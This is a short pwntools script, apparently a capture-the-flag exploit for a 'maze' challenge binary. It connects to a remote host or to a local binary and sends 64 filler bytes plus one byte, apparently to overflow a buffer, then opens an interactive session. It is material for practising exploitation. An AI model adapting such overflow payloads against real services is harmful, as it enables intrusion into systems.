from pwn import *

COMMANDS = """
  brva 0x1342
  c
"""

context.arch = "amd64"

# nc 18.226.103.146 1337
if args.REMOTE:
  c = remote("18.226.103.146", 1337)
else:
  if args.GDB:
    c = gdb.debug("./test", gdbscript=COMMANDS)
  else:
    c = process("./test")


c.recvuntil(b"You're somewhere in the maze... ")
payload = b'A' * 64 + b'\x0d'
c.send(payload)

c.interactive()